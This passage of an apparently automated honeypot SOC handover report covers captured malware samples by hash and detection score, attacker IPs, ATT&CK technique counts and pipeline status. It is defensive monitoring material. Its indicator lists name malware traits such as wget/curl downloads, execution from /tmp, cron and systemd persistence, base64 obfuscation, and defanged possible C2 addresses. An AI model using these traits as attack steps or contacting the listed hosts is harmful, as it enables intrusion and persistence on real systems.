| `94.154.43[.]196` | 1 | 2026-09-21 17:30 | 2026-09-21 17:30 | 7s | 0 | `T1592` | 🟢 LOW |
| `95.104.122[.]17` | 1 | 2026-09-21 15:57 | 2026-09-21 15:57 | 11s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.65.134[.]121` | SI | Pfcloud UG | **100** ⚠️ | 5 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `96.239.112[.]79` | US | Verizon Business | **100** ⚠️ | 4 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `193.176.31[.]206` | NL | Infrawatch Limited | **100** ⚠️ | 38 |
| `94.154.43[.]196` | TR | Storm Industries LLC | **100** ⚠️ | 50 |
| `103.70.40[.]36` | IN | Sdh Network Pvt Ltd | **100** ⚠️ | 50 |
| `8.141.12[.]219` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 4 |
| `104.194.10[.]16` | US | ReliableSite.Net LLC | **100** ⚠️ | 27 |
| `219.250.188[.]143` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 168 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 146 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 39 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 38 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 37 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 338 cases |
| Tool 34  | Credential Extractor        | ✅ 315 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 94 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (5.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 61 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 145 priority case(s) shown individually · 53 recon entry/entries in table (21 group(s) consolidating 142 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-21T19:11:31Z_
